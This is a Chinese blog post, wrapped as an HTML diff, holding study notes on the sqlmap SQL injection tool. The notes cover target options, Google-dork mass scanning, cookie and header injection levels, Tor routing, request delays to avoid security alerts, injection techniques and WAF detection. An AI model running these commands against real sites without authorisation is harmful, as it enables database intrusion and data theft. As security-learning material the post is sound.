@@ -1,0 +1,677 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>SQLMAP学习 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="SQLMAP学习">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-03-01 19:57" pubdate>
+        2020年3月1日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      43
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SQLMAP学习</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年6月17日 上午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h1 id="sqlmap学习"><a href="#sqlmap学习" class="headerlink" title="sqlmap学习"></a>sqlmap学习</h1><h3 id="1-sqlmap对目标的探测"><a href="#1-sqlmap对目标的探测" class="headerlink" title="1.sqlmap对目标的探测"></a>1.sqlmap对目标的探测</h3><p><strong>1.sqlmap直连数据库</strong></p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">服务型数据库（前提知道数据库用户名和密码）<br><span class="hljs-string">python</span> <span class="hljs-string">sqlmap</span>.<span class="hljs-string">py</span> -<span class="hljs-string">d</span> <span class="hljs-string">&quot;mysql://admin:admin@192.168.0.22:3306/dvwa(数据库名)&quot;</span> -<span class="hljs-string">f</span> <span class="hljs-built_in">--banner</span> <span class="hljs-built_in">--dbs</span> <span class="hljs-built_in">--users</span><br><span class="hljs-built_in"></span><br></code></pre></td></tr></table></figure>
+<p><strong>2.sqlmapURL探测</strong></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://www.target.com/index.php?id=1&quot;</span>  --banner//针对单一url进行探测<br><br></code></pre></td></tr></table></figure>
+<p><strong>3.sqlmap文件读取目标</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap支持从不同类型的文件中读取目标进行sql注入探测<br><span class="hljs-number">1</span>、-l 从burpsuite proxy或webScarab proxy 中读取http请求日志文件 <br>python sqlmap<span class="hljs-selector-class">.py</span> -l target<span class="hljs-selector-class">.log</span> <span class="hljs-comment">//我们代理请求日志中的内容</span><br><span class="hljs-number">2</span>、-x 从sitemap.xml站点地图文件中读取目标探测<br><span class="hljs-number">3</span>、-m 从多行文本格式文件读取多个目标，对多个目标进行探测 <span class="hljs-comment">//将多行url存在一个文件中</span><br>python sqlmap<span class="hljs-selector-class">.py</span> -m targets.txt<br><span class="hljs-number">4</span>、-r从文本文件中读取HTTP请求作为SQL注入探测而目标   <span class="hljs-comment">//用burp 抓取一个请求包，然后存在一个文本文件中</span><br>python sqlmap<span class="hljs-selector-class">.py</span> -r target.txt<br><span class="hljs-number">5</span>、-c从配置文件sqlmap.conf中读取目标探测 <span class="hljs-comment">//需要自己在该配置文件中添加目标信息</span><br></code></pre></td></tr></table></figure>
+<p>-l参数的 </p>
+<p><img src="/home/reader/Desktop/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%E7%AC%94%E8%AE%B0/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1582512866775.png" srcset="/img/loading.gif" alt="1582512866775"></p>
+<p><strong>4.sqlmap google批量扫注入</strong></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -g <span class="hljs-string">&quot;inurl:.php?id=1&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="2-sqlmap设置请求参数"><a href="#2-sqlmap设置请求参数" class="headerlink" title="2.sqlmap设置请求参数"></a>2.sqlmap设置请求参数</h3><p>0.搜索框注入</p>
+<p>sqlmap.py -r search-test.txt</p>
+<p>1.sqlmap设置HTTP方法</p>
+<p>sqlmap一般情况中，会自动在探测过程中使用适合的HTTP请求方法。但是特殊的情况，要自己设置</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">例如PUT请求方法，因此我们自己强制指定<br>--<span class="hljs-function"><span class="hljs-keyword">method</span>=<span class="hljs-title">PUT</span></span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure>
+<p>2.sqlmap设置POST请求参数</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;xxxx/vuln.php&quot;</span> --data=<span class="hljs-string">&quot;id=1&quot;</span> -<span class="hljs-keyword">f</span> --banner -dbs -users<br>-<span class="hljs-keyword">f</span> fingerprint 指纹<br></code></pre></td></tr></table></figure>
+<p>3.sqlmap设置参数分割符</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">在某些具体情况下，sqlmap需要覆盖默认参数分割符（例如&amp; in GET和POST数据），才能正确地分割和单独处理每个参数<br>python sqlmap.py -u <span class="hljs-string">&quot;http://www.target.com/vuln.php&quot;</span> <span class="hljs-params">--data=</span><span class="hljs-string">&quot;uname=admin:passwd=123&quot;</span> <span class="hljs-params">--param-del=</span><span class="hljs-string">&quot;:&quot;</span> -f <span class="hljs-params">--banner</span> <span class="hljs-params">--dbs</span> <span class="hljs-params">--users</span><br></code></pre></td></tr></table></figure>
+<p>4.sqlmap设置cookie头</p>
+<p>使用场景</p>
+<p>1.web应用程序具有基于cookie的验证的郭晨</p>
+<p>2.想利用cookie值上的SQL注入（<strong>注意：</strong>要在HTTP的cookie位置进行SQL注入检测，需要设置level到2或以上）</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">sqlmap 中用来设置cookie的参数：--cookie、--cookie-del(跟上面分割的差不多)、-load-cookies（导入特殊cookie文件）、--<span class="hljs-keyword">drop</span>-<span class="hljs-keyword">set</span>-cookie（抛掉服务器的响应setcookie的值，因为sqlmap默认的情况下，会将服务器发来的<span class="hljs-keyword">set</span>-cookie的值作为cookie的值）<br>sqlmap使用cookie的过程：<br>登录和游览页面<br>打开审计工具或代理截断，复制cookie<br>在sqlmap中使用--cookie 粘贴cookie<br><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;xxxxxxxxxx&quot;</span> --cookie <span class="hljs-string">&quot;你的cookie&quot;</span><br><br><br></code></pre></td></tr></table></figure>
+<p>5.sqlmap设置user-agent</p>
+<p><strong>注意：</strong>针对user-agent的值进行sqlmap注入探测，需要设置–level的值为3</p>
+<p>–user-agent：该参数可以让我们自定义伪造user-agent</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">一些站点在服务端检测HTTP user-<span class="hljs-built_in">agent</span>值，如果不是一个合法的值，就会中断连接。同时sqlmap也会爆出错误<br>我们除了自己伪造之外，还可以通过--<span class="hljs-built_in">random</span>-<span class="hljs-built_in">agent</span>,sqlmap将从./txt/user-<span class="hljs-built_in">agent</span>中随机选择一个用于会话中的虽有的HTTP请求<br></code></pre></td></tr></table></figure>
+<p>6.sqlmap设置host头</p>
+<p><strong>注意：</strong>对HTTP主机头进行探测的话，level的等级要设置为5，当然如果加了<strong>星号</strong>也可以指定探测如 Host: xx.xx.xx.xx *  </p>
+<p>7.sqlmap设置Referer头</p>
+<p><strong>注意：</strong>如果对Referer进行探测，level等级需要设置为3</p>
+<p>8.sqlmap设置额外的HTTP头</p>
+<p>9.sqlmap设置http协议认证</p>
+<p>sqlmap中设置HTTP协议认证参数：–auth-type和–auth-cred</p>
+<p>其中–auth-type支持Basic、Digest、NTLLM</p>
+<p>–auth-cred认证语法为：你的用户名:你的密码（身份认证）</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;xxxxxxx&quot;</span> --auth-<span class="hljs-built_in">type</span> Basic --auth-cred <span class="hljs-string">&quot;teacher:password&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+<p>10.sqlmap设置HTTP代理</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap中设置代理的参数:--proxy/--proxy-cred/--proxy-file/--ignore-proxy<br>--proxy用来设置HTTP代理服务器位置 格式：--proxy <span class="hljs-link">http://ip</span>[<span class="hljs-string">:port</span>]<br>--proxy用来设置有些代理器服务器登录信息的<br>--proxy-file 用来使用存在文本中的多条代理<br>--ignore-proxy 当是用来访问本地网络时，用--ignore-proxy忽略使用代理<br></code></pre></td></tr></table></figure>
+
+
+<p>11.sqlmap设置tor隐藏网络</p>
+<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">--tor/--tor-port/--tor-<span class="hljs-class"><span class="hljs-keyword">type</span>/--<span class="hljs-title">check</span>-<span class="hljs-title">tor</span></span>(这个是查看该tor是否可以用)<br>python sqlmap.py -u <span class="hljs-string">&quot;xxxxxxx&quot;</span> --tor-<span class="hljs-class"><span class="hljs-keyword">type</span></span>=asda（故意输错后，sqlmap会提示<span class="hljs-class"><span class="hljs-keyword">type</span>） --<span class="hljs-title">check</span>-<span class="hljs-title">tor</span></span><br></code></pre></td></tr></table></figure>
+
+
+<p>12.sqlmap设置延迟</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haskell">有时候sqlmap的访问请求的速度过快有可能会引起目标的安全警示，直接静止我们的网络访问<br>因此我们需要设置延迟来延缓sqlmap的请求速度<br><span class="hljs-comment">--delay 0.5 设置延迟0.5秒</span><br></code></pre></td></tr></table></figure>
+
+
+<p>13.sqlmap设置超时</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-comment">--timeout 有效值是一个浮点数是，所以我们可以设置10.5,sqlmap默认是30秒</span><br>例如：<span class="hljs-comment">--timeout 10.5 如果在10.5秒内，对方没有响应我们的请求，sqlmap就判定对方是一个无用页面</span><br></code></pre></td></tr></table></figure>
+
+
+<p>14.sqlmap设置重试次数</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-comment">--retries 要设置的对应次数，默认情况下是重试三次</span><br></code></pre></td></tr></table></figure>
+
+
+<p>15.sqlmap设置随机化参数</p>
+<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gml">python sqlmap.py -u <span class="hljs-string">&quot;http://www.target.com/index.php?id=1&quot;</span> --<span class="hljs-built_in">randomize</span> <span class="hljs-symbol">id</span>(参数名称)<br>随后sqlmap对目标的探测过程中，会随机的变化<span class="hljs-symbol">id</span>的值，但是长度和类型和原来保持一致<br></code></pre></td></tr></table></figure>
+
+
+<p>16.sqlmap设置日志过滤目标</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">（-l 从burpsuite proxy或webScarab<span class="hljs-built_in"> proxy </span>中读取http请求日志文件 ）<br>这个是我们从burpsuite中的请求日志从选择目标进行探测的参数，但是如果请求日志文件中饱含着太多的无用目标，会浪费他多时间，所以可以过滤没用的目标进行探测(指定有效的Python正则表达式，用于过滤目标)<br>python sqlmap -l <span class="hljs-string">&quot;burp.log&quot;</span>  <span class="hljs-attribute">--scope</span>=<span class="hljs-string">&quot;(www)?\.target\.(com|net|org)&quot;</span><br></code></pre></td></tr></table></figure>
+<p>–skip-rulencode 不进行url加密</p>
+<p>17.sqlmap设置忽略401</p>
+<p>–ignore-401可以用来绕过basic验证</p>
+<p>18.sqlmap设置HTTP协议私钥</p>
+<p>当服务器需要适当的客户端证书和用于身份验证的私钥时，应该要运用此项。提供的值应该是一个PEM格式的KEY_FILE,其中包含证书和私钥</p>
+<p>–auth-file 文件名</p>
+<p><strong>19.sqlmap设置安全模式</strong></p>
+<p>避免在多次请求后销毁会话,因为在探测过程中肯定会有一定数量不成功的请求，在这种情况下，web应用有可能会销毁会话</p>
+<p>–safe-url/–safe-post/–safe-req（用于-r的）/–safe-freq（用于-l ）</p>
+<p>20.sqlmap设置忽略url编码</p>
+<p>据参数的位置（例如GET），在默认情况下它的值可以使url编码的。在某些情况下，后端的web服务起不遵循RFC标准，需要以原始的非编码形式发送值，在这种情况下使用–skip-rulencode 不进行url加密</p>
+<h3 id="3-sql性能优化"><a href="#3-sql性能优化" class="headerlink" title="3.sql性能优化"></a>3.sql性能优化</h3><p>0.-o参数可以开启所有性能优化参数</p>
+<p>1.sqlmap设置持久HTTP连接，让我们不用重新建立连接，加快探测，保护了目标的资源</p>
+<p>在HTTP报文中设置connection: keep-alive</p>
+<figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-literal">--keep-alive</span><br></code></pre></td></tr></table></figure>
+<p>2.sqlmap设置不接受HTTP body</p>
+<p>在sqlmap中设置空连接，不接受响应包中的body，只接受响应头，加快我们的请求速度</p>
+<p><strong>常用在盲注过程中</strong></p>
+<p>–null-connection：为了检索没有body响应的内容</p>
+<p>3.sqlmap设置多线程加快速度</p>
+<p>sqlmap设置同时发送多少个HTTP请求的多线程</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-params">--thread</span> 10 <span class="hljs-string">//</span>默认的情况下是1线程，但是为了不妨碍对方的服务器资源，我们最大设置的线程是10<br></code></pre></td></tr></table></figure>
+<p>4.sqlmap设置预测输出</p>
+<p>–predict-output和线程参数是不兼容的</p>
+<h3 id="4-sqlmap测试参数"><a href="#4-sqlmap测试参数" class="headerlink" title="4.sqlmap测试参数"></a>4.sqlmap测试参数</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">-p、<span class="hljs-params">--param-exclude</span>、<span class="hljs-params">--skip-static</span><br>-p：指定具体探测参数；例如：-p <span class="hljs-string">&quot;id,user-agent&quot;</span><br><span class="hljs-params">--skip</span>：忽略探测具体的参数。例如：<span class="hljs-params">--level</span> 5 <span class="hljs-params">--skip</span> <span class="hljs-string">&quot;user-agent,referer&quot;</span><br><span class="hljs-params">--param-exclude</span>:忽略包含具体内容的参数。例如：<span class="hljs-params">--param-exclude=</span><span class="hljs-string">&quot;token|session&quot;</span>不对包含token或session的参数进行探测<br><span class="hljs-params">--skip-static</span>：忽略非动态参数<br><br>当我们要探测http:<span class="hljs-string">//192.168.0.20/sqli/less123/</span>?id=1&amp;us=uasne中的id参数进行探测，我们得手动指向url路径中的id参数，我们必须在命令行中添加星号（*）来指定这些注入点<br>当使用Apache web服务器的mod_rewrite模块或其它类似的技术时，这就显得特别有用了<br>python sqlmap.py -u <span class="hljs-string">&quot;http://192.168.0.20/sqli/less123/?id=1*&amp;us=uasne&quot;</span><br>也可以指定多个位置<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="5-sqlmap注入参数"><a href="#5-sqlmap注入参数" class="headerlink" title="5.sqlmap注入参数"></a>5.sqlmap注入参数</h3><p>1.sqlmap强制设置dbms</p>
+<p>默认情况下sqlmap会自动识别探测目标web应用程序的后端数据库管理系统(dbms)，以下列出sqlmap完全支持的dbms种类。</p>
+<p>MYSQL、oracle、Microsoft sql server、IBM db2、sqlite、firebird、sybase、sap maxdb、hsqldb、informix</p>
+<p>–dbms 数据库管理系统名称[版本号]</p>
+<p>例如：–dbms mysql 5.0、–dbms microsoft sql server 05</p>
+<p>2.sqlmap强制指定os</p>
+<p>默认情况下sqlmap会自动识别探测目标web应用程序后端操作系统(os)，以下列出sqlmap完全支持的os种类</p>
+<p>Linux、Windows</p>
+<p>例如：–os windows 或者–os linux</p>
+<h3 id="6-sqlmap自定义检测参数"><a href="#6-sqlmap自定义检测参数" class="headerlink" title="6.sqlmap自定义检测参数"></a>6.sqlmap自定义检测参数</h3><p>1、sqlmap探测等级</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">参数：<span class="hljs-comment">--level</span><br><br>共有五个等级，默认为<span class="hljs-number">1</span>，sqlmap使用的payload可以在<span class="hljs-type">xml</span>/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。<br>这个参数不仅影响使用哪些payload同时也会影响测试的注入点，<span class="hljs-keyword">GET</span>和POST的数据都会测试，HTTP Cookie在<span class="hljs-keyword">level</span>为<span class="hljs-number">2</span>的时候就会测试，HTTP <span class="hljs-keyword">User</span>-Agent/Referer头在<span class="hljs-keyword">level</span>为<span class="hljs-number">3</span>的时候就会测试。<br>总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的<span class="hljs-keyword">level</span>值。<br><br></code></pre></td></tr></table></figure>
+<p>2.显示调试信息</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">-v  显示调试信息 有<span class="hljs-number">7</span>个级别<br><br><span class="hljs-number">0</span>、只显示<span class="hljs-keyword">python</span>错误以及严重的信息。<br><span class="hljs-number">1</span>、同时显示基本信息和警告信息。（默认）<br><span class="hljs-number">2</span>、同时显示<span class="hljs-keyword">debug</span>信息。<br><span class="hljs-number">3</span>、同时显示注入的payload。<br><span class="hljs-number">4</span>、同时显示HTTP请求。<br><span class="hljs-number">5</span>、同时显示HTTP响应头。<br><span class="hljs-number">6</span>、同时显示HTTP响应页面。<br><br><br></code></pre></td></tr></table></figure>
+<p>3.风险等级</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">参数：<span class="hljs-comment">--risk</span><br><br>共有四个风险等级，默认是<span class="hljs-number">1</span>会测试大部分的测试语句，<span class="hljs-number">2</span>会增加基于事件的测试语句，<span class="hljs-number">3</span>会增加<span class="hljs-keyword">OR</span>语句的<span class="hljs-keyword">SQL</span>注入测试。<br><br>在有些时候，例如在<span class="hljs-keyword">UPDATE</span>的语句中，注入一个<span class="hljs-keyword">OR</span>的测试语句，可能导致更新的整个表，可能造成很大的风险。<br><br>测试的语句同样可以在<span class="hljs-type">xml</span>/payloads.xml中找到，你也可以自行添加payload。<br><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="7-sqlmap注入技术参数"><a href="#7-sqlmap注入技术参数" class="headerlink" title="7.sqlmap注入技术参数"></a>7.sqlmap注入技术参数</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">--technique</span><br>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。<br><br>支持的探测方式如下：<br><br>B: <span class="hljs-type">Boolean</span>-based blind <span class="hljs-keyword">SQL</span> injection（布尔型注入）<br>E: Error-based <span class="hljs-keyword">SQL</span> injection（报错型注入）<br>U: <span class="hljs-keyword">UNION</span> query <span class="hljs-keyword">SQL</span> injection（可联合查询注入）<br>S: <span class="hljs-keyword">Stacked</span> queries <span class="hljs-keyword">SQL</span> injection（可多语句查询注入）<br>T: <span class="hljs-type">Time</span>-based blind <span class="hljs-keyword">SQL</span> injection（基于时间延迟注入）<br><br></code></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">--identify-waf<br>sqlmap可以尝试找出WAF<span class="hljs-regexp">/IPS/</span>IDS保护，方便用户做出绕过方式。目前大约支持<span class="hljs-number">30</span>种产品的识别。<br><br>--check-waf<br>WAF<span class="hljs-regexp">/IPS/</span>IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。 sqlmap将会使用一个不存在的参数来注入测试<br>例如对一个受到ModSecurity WAF保护的MySQL例子：<br>$ python sqlmap.py -u <span class="hljs-string">&quot;http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;</span> --identify-waf -v <span class="hljs-number">3</span><br><br></code></pre></td></tr></table></figure>
